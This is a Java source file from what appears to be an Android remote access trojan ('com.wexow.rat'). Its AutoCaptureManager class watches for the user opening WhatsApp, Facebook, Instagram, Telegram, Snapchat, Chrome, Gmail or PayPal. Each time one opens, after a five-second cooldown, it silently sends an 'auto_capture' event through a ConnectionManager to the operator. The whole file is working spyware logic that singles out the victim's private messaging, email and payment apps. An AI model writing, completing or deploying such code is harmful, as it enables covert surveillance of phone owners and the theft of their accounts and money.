package com.wexow.rat.managers;

import android.content.Context;

import org.json.JSONObject;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

import com.wexow.rat.core.ConnectionManager;

public class AutoCaptureManager {
    private static boolean enabled = true;
    private static long lastCapture = 0;
    private static final long COOLDOWN = 5000;

    private static final Set<String> SENSITIVE = new HashSet<>(Arrays.asList(
        "com.whatsapp", "com.facebook.katana", "com.instagram.android",
        "org.telegram.messenger", "com.snapchat.android",
        "com.android.chrome", "com.google.android.gm",
        "com.paypal.android.p2pmobile"
    ));

    public static void setEnabled(boolean e) { enabled = e; }

    public static void onAppOpened(Context ctx, String pkg) {
        if (!enabled) return;
        if (!SENSITIVE.contains(pkg)) return;

        long now = System.currentTimeMillis();
        if (now - lastCapture < COOLDOWN) return;
        lastCapture = now;

        try {
            JSONObject jo = new JSONObject();
            jo.put("type", "auto_capture");
            jo.put("app", pkg);
            jo.put("time", now);
            ConnectionManager.send(jo.toString());
        } catch (Exception ignored) {}
    }
}